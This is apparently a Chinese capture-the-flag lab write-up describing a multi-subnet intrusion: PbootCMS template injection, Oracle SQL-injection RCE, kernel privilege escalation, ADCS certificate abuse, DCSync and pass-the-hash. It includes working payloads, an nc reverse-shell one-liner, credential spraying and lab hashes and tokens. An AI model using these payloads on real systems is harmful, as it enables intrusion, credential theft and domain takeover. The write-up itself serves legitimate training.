# 春秋云境-无间计划 WP-先知社区

> **来源**: https://xz.aliyun.com/news/16130  
> **文章ID**: 16130

---

# 无间计划

## flag1（172.23.4.32）

参考文章：<https://guokeya.github.io/post/WscncUrcS/>

里哟给模板注入漏洞命令执行，hex编码绕过waf检测

![](images/20241210172730-fa533bfa-b6d8-1.png)

```
GET /?a=}{pboot{user:password}:if(("sy\x73\x74em")("whoami"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
Host: 39.101.141.214
Cookie: lg=cn; PbootSystem=ctkgo5eef5119p3o413i0dln79
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close

```

我这里用vshell直接一键上线了，附上狗and猫师傅的反弹手法

```
?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx 9383 >/tmp/f"));//)}xxx{/pboot{user:password}:if}

```

内核探针扫描

![](images/20241210172751-076472d2-b6d9-1.png)

尝试攻击，感觉扫描有点问题，最后用的[CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588/tree/master)提权，直接运行即可得到一个user/user的root用户，后面su user拿flag即可，搭建代理，扫描一下内网，结果如下。

```
172.23.4.32:80 open
172.23.4.19:22 open
172.23.4.51:445 open
172.23.4.12:445 open
172.23.4.51:139 open
172.23.4.12:139 open
172.23.4.51:135 open
172.23.4.12:135 open
172.23.4.19:80 open
172.23.4.32:22 open
[*] NetInfo:
[*]172.23.4.51
   [->]iZ90rh9ud57juyZ
   [->]172.23.4.51
[*] NetBios: 172.23.4.12     PENTEST\IZMN9U6ZO3VTRNZ        
[*] NetInfo:
[*]172.23.4.12
   [->]IZMN9U6ZO3VTRNZ
   [->]172.23.4.12
   [->]172.24.7.16
[*] WebTitle: http://172.23.4.19        code:200 len:481    title:Search UserInfo
[*] NetBios: 172.23.4.51     WORKGROUP\IZ90RH9UD57JUYZ      
[*] WebTitle: http://172.23.4.32        code:200 len:19779  title:PbootCMS-永久开源免费的PHP企业网站开发建设管理系统
[+] http://172.23.4.32/www.zip poc-yaml-backup-file
[+] http://172.23.4.32 poc-yaml-phpstudy-nginx-wrong-resolve php

```

## flag2（172.23.4.51）

oracle注入，可以rce，但是非常非常卡

```
1. 创建JAVA Source
admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual)>1 --

2.提权
admin' AND (SELECT dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set('''' a'''',''''a'''',''''a''''''''||TEST.pwn()||''''''''a'''',''''Y'''',s ysdate,sysdate);end;''; commit; end;') from dual)>1--

3.创建函数
admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LINXRUNCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual)>1--

4.查询创建的函数
admin' union select null,(select object_name from all_objects where object_name ='LINXRUNCMD' and rownum=1),null from dual--

5.查询java source
admin' union select null,(select object_name from all_objects where object_name ='LinxUtil'),null from dual--

6.命令执行
admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--

```

## flag3（172.23.4.12）

从上面的oracle机器拿到账号密码

```
username: usera@pentest.me
password：Admin3gv83

```

爆破一波c段

```
proxychains4 crackmapexec smb 172.23.4.0/24 -u usera -p Admin3gv83 -d pentest.me 2>/dev/null

```

![](images/20241210172804-0edb1296-b6d9-1.png)

rdp上去之后flag就在桌面上，ipconfig发现此机器为双网卡机器

## flag4（172.23.4.19）

```
172.23.4.32 拿下
172.23.4.51 拿下
172.23.4.12 拿下
```

还剩一个19，对刚拿下的12进行信息收集，发现如下内容

![](images/20241210172812-13742306-b6d9-1.png)

是在hosts里面发现其连接过19机器，所以尝试对19使用私钥连接

```
proxychains4 ssh -i id_rsa 172.23.4.19
```

flag在根目录

![](images/20241210172825-1b20e652-b6d9-1.png)

## flag5（172.24.7.3）

我们回到上面的12机器，搭建代理链，扫描其第二个网段，结果如下

```
172.24.7.23:22 open
172.24.7.48:445 open
172.24.7.43:445 open
172.24.7.5:445 open
172.24.7.16:445 open
172.24.7.3:445 open
172.24.7.43:139 open
172.24.7.48:139 open
172.24.7.5:139 open
172.24.7.16:135 open
172.24.7.5:135 open
172.24.7.3:135 open
172.24.7.23:80 open
172.24.7.3:80 open
172.24.7.27:22 open
172.24.7.3:139 open
172.24.7.16:139 open
172.24.7.48:135 open
172.24.7.43:135 open
172.24.7.5:88 open
172.24.7.3:88 open
172.24.7.23:8060 open
172.24.7.27:8091 open
172.24.7.27:8090 open
172.24.7.23:9094 open
172.24.7.16:10000 open
[*] NetInfo 
[*]172.24.7.5
   [->]DCadmin
   [->]172.25.12.7
   [->]172.24.7.5
[*] NetInfo 
[*]172.24.7.16
   [->]IZMN9U6ZO3VTRNZ
   [->]172.23.4.12
   [->]172.24.7.16
[*] NetInfo 
[*]172.24.7.48
   [->]IZAYSXE6VCUHB4Z
   [->]172.24.7.48
[*] NetInfo 
[*]172.24.7.43
   [->]IZMN9U6ZO3VTRPZ
   [->]172.24.7.43
   [->]172.26.8.12
[*] NetBios 172.24.7.48     PENTEST\IZAYSXE6VCUHB4Z       
[*] NetInfo 
[*]172.24.7.3
   [->]DC
   [->]172.24.7.3
   [->]172.25.12.9
[*] NetBios 172.24.7.43     PENTEST\IZMN9U6ZO3VTRPZ       
[*] WebTitle http://172.24.7.23:8060   code:404 len:555    title:404 Not Found
[*] NetBios 172.24.7.5      [+] DC:DCadmin.pen.me                Windows Server 2016 Standard 14393
[*] OsInfo 172.24.7.3   (Windows Server 2016 Standard 14393)
[*] NetBios 172.24.7.3      [+] DC:DC.pentest.me                 Windows Server 2016 Standard 14393
[*] OsInfo 172.24.7.5   (Windows Server 2016 Standard 14393)
[*] WebTitle http://172.24.7.23        code:302 len:98     title:None 跳转url: http://172.24.7.23/users/sign_in
[*] WebTitle http://172.24.7.27:8091   code:204 len:0      title:None
[*] WebTitle http://172.24.7.16:10000  code:400 len:0      title:None
[*] WebTitle http://172.24.7.3         code:200 len:703    title:IIS Windows Server
[*] WebTitle http://172.24.7.27:8090   code:302 len:0      title:None 跳转url: http://172.24.7.27:8090/login.action?os_destination=%2Findex.action&permissionViolation=true
[*] WebTitle http://172.24.7.23/users/sign_in code:200 len:30152  title:Sign in · GitLab
[+] PocScan http://172.24.7.3 poc-yaml-active-directory-certsrv-detect 
[+] InfoScan http://172.24.7.27:8090/login.action?os_destination=%2Findex.action&permissionViolation=true [ATLASSIAN-Confluence]

```

简单整理下

```
172.24.7.16 拿下
172.24.7.3 DC
172.24.7.5 DCadmin
172.24.7.23
172.24.7.27
172.24.7.43 IZMN9U6ZO3VTRPZ
172.24.7.48 IZAYSXE6VCUHB4Z
```

![](images/20241210172834-207f4eea-b6d9-1.png)

可以确定DC就是3这台机器，信息收集一波，发现存在CA服务器，尝试利用CA漏洞对域控提权

![](images/20241210172841-2508b33e-b6d9-1.png)

确认ip

![](images/20241210172848-28c7b786-b6d9-1.png)

**申请证书**

```
proxychains4 certipy req -u 'usera@pentest.me' -p 'Admin3gv83' -target 172.24.7.3 -dc-ip 172.24.7.3 -ca 'pentest-DC-CA' -template 'User'

```

记得加pentest-DC-CA的host

**检测一下**

```
proxychains4 certipy auth -pfx usera.pfx -dc-ip 172.24.7.3

```

返回hash，没问题

![](images/20241210172855-2d7a8312-b6d9-1.png)

**创建一个机器账户**

```
python bloodyAD.py -d pentest.me -u usera -p Admin3gv83 --host 172.24.7.3 addComputer "Chu0" "whoami@666"

```

**设置机器账户属性(dNSHostName和DC一致)**

```
python bloodyAD.py -d pentest.me -u usera -p Admin3gv83 --host 172.24.7.3 setAttribute "CN=Chu0,CN=Computers,DC=pentest,DC=me" dNSHostName "[\"DC.pentest.me\"]"

```

记得加hosts

![](images/20241210172903-31ee2dc2-b6d9-1.png)

**再次申请证书**

```
proxychains4 certipy req -u 'Chu0$@pentest.me' -p 'whoami@666' -template Machine -dc-ip 172.24.7.3 -ca 'pentest-DC-CA' -debug 2>/dev/null

```

![](images/20241210172913-37d2a31c-b6d9-1.png)

**检测证书**

```
proxychains4 certipy auth -pfx ./dc.pfx -dc-ip 172.24.7.3

```

返回hash，没问题

![](images/20241210172928-40f3ff0e-b6d9-1.png)

**dump哈希**

```
proxychains4 impacket-secretsdump 'dc$@pentest.me@DC.pentest.me' -hashes :f3cd1975ace5ef84a34bbc8bb25ad048

```

![](images/20241210172935-44cb209e-b6d9-1.png)

**利用哈希横向**

```
proxychains4 impacket-smbexec  -hashes :5d0f79eaf7a6c0ad70bcfce6522d2da1 pentest.me/administrator@172.24.7.3

```

![](images/20241210172942-49016be6-b6d9-1.png)

ipconfig发现dc还是个双网卡，存在12网段，添加一个用户上去

```
net user Chu0 whoami@666 /add
net localgroup administrators Chu0 /add

```

## flag6（172.24.7.5）

整理一下

```
172.24.7.16 拿下
172.24.7.3 DC 拿下
172.24.7.5 DCadmin 
172.24.7.23
172.24.7.27
172.24.7.43 IZMN9U6ZO3VTRPZ
172.24.7.48 IZAYSXE6VCUHB4Z

```

横向172.24.7.5，又拿到一个flag

![](images/20241210172949-4d63834a-b6d9-1.png)

## flag7（172.24.7.48）

再整理一下

```
172.24.7.16 拿下
172.24.7.3 DC 拿下
172.24.7.5 DCadmin 拿下
172.24.7.23 
172.24.7.27
172.24.7.43 IZMN9U6ZO3VTRPZ
172.24.7.48 IZAYSXE6VCUHB4Z

```

23和27横向不过去，横向48

![](images/20241210172955-512e0dce-b6d9-1.png)

## flag8（172.24.7.43）

再整理一下

```
172.24.7.16 拿下
172.24.7.3 DC 拿下
172.24.7.5 DCadmin 拿下
172.24.7.23 
172.24.7.27
172.24.7.43 IZMN9U6ZO3VTRPZ
172.24.7.48 IZAYSXE6VCUHB4Z 拿下

```

横向43，又拿下一个flag，到这里7网段的基本就打完了

## flag9（172.25.12.29）

到这里，基本就要回到上面的DC的第二个网卡了，还是老一套，fscan+代理，结果如下

```
172.25.12.9:445 open
172.25.12.9:135 open
172.25.12.7:445 open
172.25.12.29:445 open
172.25.12.9:139 open
172.25.12.7:139 open
172.25.12.29:139 open
172.25.12.7:135 open
172.25.12.29:135 open
172.25.12.9:80 open
172.25.12.9:88 open
172.25.12.7:88 open
[*] alive ports len is: 12
start vulscan
[*] NetInfo
[*]172.25.12.9
   [->]DC
   [->]172.24.7.3
   [->]172.25.12.9
[*] OsInfo 172.25.12.9  (Windows Server 2016 Standard 14393)
[*] NetInfo
[*]172.25.12.29
   [->]IZ88QYK8Y8Y3VXZ
   [->]172.25.12.29
[*] NetInfo
[*]172.25.12.7
   [->]DCadmin
   [->]172.25.12.7
   [->]172.24.7.5
[*] NetBios 172.25.12.29    PEN\IZ88QYK8Y8Y3VXZ
[*] NetBios 172.25.12.7     [+] DC:DCadmin.pen.me                Windows Server 2016 Standard 14393
[*] OsInfo 172.25.12.7  (Windows Server 2016 Standard 14393)
[*] WebTitle http://172.25.12.9        code:200 len:703    title:IIS Windows Server
已完成 12/12
[*] 扫描结束,耗时: 15.9775684s

```

整理一下

```
172.25.12.7 DCadmin 拿下
172.25.12.9 DC 拿下
172.25.12.29 IZ88QYK8Y8Y3VXZ
```

这里发现有一个新的域pen.me，这个其实在上面就出现过了，这里我又一个一个横向过去找了下，发现DCadmin其实就是此域的域管

![](images/20241210173004-56a84936-b6d9-1.png)

所以这里就直接创建一个用户上去，DCadmin机器的flag甚至提示了dcsync，机器上开了df记得关

```
mimikatz.exe "lsadump::dcsync /domain:pen.me /all /csv" exit

```

利用横向的system权限执行，新建的用户执行不了

![](images/20241210173011-5aa11cc0-b6d9-1.png)

```
proxychains4 impacket-smbexec  -hashes :0f91138ef5392b87416ed41cb6e810b7 pen.me/administrator@172.25.12.29

```

这里的DCadmin是开了防火墙的，搭建代理如果不通的话记得关防火墙

## flag10（172.25.12.19）

```
172.25.12.7 DCadmin 拿下
172.25.12.9 DC 拿下
172.25.12.29 IZ88QYK8Y8Y3VXZ 拿下

```

老样子，横向

```
proxychains4 impacket-smbexec  -hashes :0f91138ef5392b87416ed41cb6e810b7 pen.me/administrator@172.25.12.19

```

## flag11（172.25.12.19）

建一个用户rdp上去把邮件搞下来，邮件里面有一个flag

## flag12（172.26.8.16）

之前在打4段的时候看到这么个东西，带着域名试了下没进去，后面发现原来不用加域（难绷

```
usera/Admin3gv83

```

![](images/20241210173023-61750264-b6d9-1.png)

里面有一堆账号密码，利用gitlab查看登录过gitlab的用户

**获取token**

```
echo 'grant_type=password&username=usera&password=Admin3gv83' > auth.txt

```

```
{"access_token":"1256b54bb609ded0f5290321e1ccd31861f9e6606cc62af650ffcc264df35ccf","token_type":"Bearer","expires_in":7200,"refresh_token":"de059ce1fca6b7c197e1e6933d09eb902ed4eaac1ee7bb4699f9dd323e70fb55","scope":"api","created_at":1723460611}

```

**查看用户**

```
proxychains4 -q curl --header "Authorization: Bearer 1256b54bb609ded0f5290321e1ccd31861f9e6606cc62af650ffcc264df35ccf" http://172.24.7.23/api/v4/users

```

```
[{"id":3,"username":"luzizhuo","name":"luzizhuo","state":"active","avatar_url":"https://www.gravatar.com/avatar/95b2443ac507c09e96aa8da7c5b46573?s=80\u0026d=identicon","web_url":"http://172.24.7.23/luzizhuo"},{"id":2,"username":"usera","name":"usera","state":"active","avatar_url":"https://www.gravatar.com/avatar/e0e86917a42d2561ffc8772948d5a596?s=80\u0026d=identicon","web_url":"http://172.24.7.23/usera"},{"id":1,"username":"root","name":"Administrator","state":"active","avatar_url":"https://www.gravatar.com/avatar/e64c7d89f26bd1972efa854d13d7dd61?s=80\u0026d=identicon","web_url":"http://172.24.7.23/root"}]

```

得到三个用户

```
luzizhuo  usera  root
```

利用luzizhuo账户登录，里面有一个项目，下载，找了下里面有几个数据库的配置文件，但是没啥用，连不上，commit还有一个配置信息

![](images/20241210173033-6768180a-b6d9-1.png)

有一个8网段的ip，感觉有点眼熟，看了下是上面43机器的另一个网段，所以又回43建了个新用户，搭代理，后面用MDUT上去预备用土豆提权，结果有df，不会免杀hhhhh，后面看了眼狗and猫师傅的wp，用Pysql提权了

<https://github.com/Ridter/PySQLTools>

```
enable_ole
enable_clr
install_clr
clr_badpotato type C:\Users\Administrator\Desktop\flag.txt

```

至此，结束
